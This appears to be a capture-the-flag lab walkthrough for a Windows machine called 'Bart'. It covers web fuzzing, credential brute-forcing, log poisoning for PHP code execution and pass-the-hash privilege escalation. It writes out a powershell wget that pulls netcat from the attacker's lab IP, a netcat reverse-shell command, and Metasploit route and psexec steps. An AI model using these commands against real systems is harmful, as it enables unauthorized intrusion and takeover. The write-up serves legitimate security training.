# Bart

*Converted from: Bart.pdf*

---

# Bart
## **14 [th] July 2018 / Document No D18.100.11**

**Prepared By: Alexander Reid (Arrexel)**

**Machine Author: mrh4sh**

**Difficulty: Hard**

**Classification: Official**



Page 1 / 10


## **SYNOPSIS**

Bart is a fairly realistic machine, mainly focusing on proper enumeration techniques. There are

several security policies in place which can increase the difficulty for those who are not familiar

with Windows environments.


## **Skills Required**


  - Intermediate knowledge of Windows

  - Knowledge of PowerShell or other

methods for enumerating Windows


## **Skills Learned**


  - Troubleshooting web fuzzing tools

  - Enumerating potential credential

combinations

  - Enumerating subdomains

  - Reviewing open source software for

changes and vulnerabilities

  - Log poisoning

  - Pass the hash technique without direct

network access to SMB


Page 2 / 10


## **Enumeration** **Nmap**

Nmap reveals only an IIS server running on the target.



Page 3 / 10


​ ​


## **wfuzz**

As there is a 200 response for most valid results, most common fuzzing tools are not very useful

here. Using wfuzz and hiding output with 158607 chars finds a **monitor** ​ and **forum** ​ directory.


Page 4 / 10



​ ​


​ ​


## **Users**

Several names can be found on **bart.htb/forum** ​, including **Harvey Potter** ​ which can be found in a

commented out section of the source.


Page 5 / 10



​ ​



​ ​


​


​


## **Exploitation** **Monitor**

Using Burp Intruder or any similar tool, it is fairly simple to find valid credentials for the monitor

login page. A valid login (harvey:potter) will result in a redirect to **monitor.bart.htb** ​, which must be

added to /etc/hosts.


Attempting to view the chat reveals the subdomain **internal-01.bart.htb** ​ .


Page 6 / 10



​


​



​


​


​


​


​ ​


## **php-ajax-simple-chat**

[Source: https://github.com/magkopian/php-ajax-simple-chat​](https://github.com/magkopian/php-ajax-simple-chat)


A bit of searching finds the above github repository. Reviewing the source code, it is fairly

obvious that a user account can be created by sending a request manually. Note that the

password must be 8 characters or longer.


Once logged in, a **Log** ​ feature is visible which is not included in the original source code.


[http://internal-01.bart.htb/log/log.php?filename=log.php&username=harvey](http://internal-01.bart.htb/log/log.php?filename=log.php&username=harvey)


Attempting to load **log.php** ​ instead of **log.txt** ​ will result in output being displayed which includes

the user agent. At this point it is fairly obvious that log poisoning through the user agent can be

leveraged to achieve code execution.


Page 7 / 10



​


​


​ ​



​


​


​ ​


​

​

​



Using the injected PHP exec, a 64-bit netcat Windows executable can be served from the local

​

​

​



machine. The command **powershell “wget http://<LAB IP>/nc64.exe -OutFile nc64.exe”** ​ will

​

​



​

successfully grab the file, and the command **nc64.exe <LAB IP> <PORT> -e cmd.exe** ​ will open a

​



​

​

shell as **nt authority\iusr** ​ .



​

​

​



​

​

​


Page 8 / 10


​

​


​


​


## **Privilege Escalation** **Administrator**

[PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc​](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)


Executing powershell with **powershell -ExecutionPolicy Bypass** ​ will allow running of local scripts.

After dropping PowerUp on the target and starting powershell, it can be loaded with

**Import-Module ./PowerUp.ps1** and executed with **Invoke-AllChecks** ​, revealing Administrator

autologon credentials in the registry.


As SMB is not open to the network, a route must be added or alternatively port forwarding can be

used. To simplify things, switching to Metasploit is ideal. Using the **windows/smb/smb_delivery** ​

module successfully spawns a Meterpreter session when using the following settings.


Page 9 / 10



​

​


​


​



​

​


​


​


​



Once a Meterpreter shell is obtained, a route can be added with the command **route add** ​



​

**10.10.10.81/32 255.255.255.255 <SESSION ID>** followed by use of the



​


**admin/smb/psexec_command** module for pass the hash. For the command, executing the



​


existing netcat binary is likely the simplest option.



​



​


Listening on a different port and triggering the psexec module will immediately grant a shell as

the Administrator user.


Page 10 / 10



​


